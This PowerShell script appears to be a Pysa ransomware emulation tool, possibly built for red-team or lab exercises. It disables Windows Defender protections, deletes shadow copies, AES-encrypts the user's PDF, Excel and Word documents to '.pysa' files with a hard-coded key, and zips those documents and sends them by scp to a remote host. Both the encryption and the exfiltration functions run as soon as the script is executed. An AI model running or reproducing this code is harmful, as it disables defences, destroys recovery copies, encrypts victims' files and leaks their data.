<#
Source for below:
https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps2
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".pysa"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# List Files in a Directory
# List all Files and print full path
#Get-ChildItem -Recurse  -include *.pdf,*.xlsx,*.docx -Path .\Documents | select fullname

# List all files, dump to csv, read in and encrypt said files
function Emulate-Pysa {
    # Disable windows defender and controlled folder access
    Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled

    # Delete shadow copies
    vssadmin delete shadows /all

    #Export to csv
    Get-ChildItem -Recurse  -include *.pdf,*.xlsx,*.docx -Path .\Documents | export-csv `
    -Path files.csv

    # Import CSV file.
    $fileList = import-csv -path .\files.csv -header FullName

    #Loop through results
    foreach ($f in $fileList) {

        #Encrypt each file
        Invoke-AESEncryption -Mode Encrypt -Key "apple" -Path $f.FullName
        #Get-ChildItem -Path $f.FullName

    }
}

function Exfiltrate-Data {
    # Scan for possibly important files
    Get-ChildItem -Recurse  -include *.pdf,*.xlsx,*.docx -Path .\Documents | export-csv `
    -Path importantfiles.csv

    # Import CSV file.
    $fileList = import-csv -path .\importantfiles.csv -header FullName

    # Create our new directory
    New-Item -Path "." -Name "exfil" -ItemType "directory"

    # Loop through results
    foreach ($f in $fileList) {
        # Copy the files we are exfiltrating
        Get-ChildItem -Path $f.FullName | Copy-Item -Destination ".\exfil"
    }
    # zip the directory
    Compress-Archive -Path ".\exfil" -Destination "exfil.zip"

    # Ship said data off
    scp "exfil.zip" "sam-adm@10.0.78.5:"
}

Exfiltrate-Data
Emulate-Pysa

# Remove File
#Invoke-Expression "C:\Users\dove\Documents\update.bat"
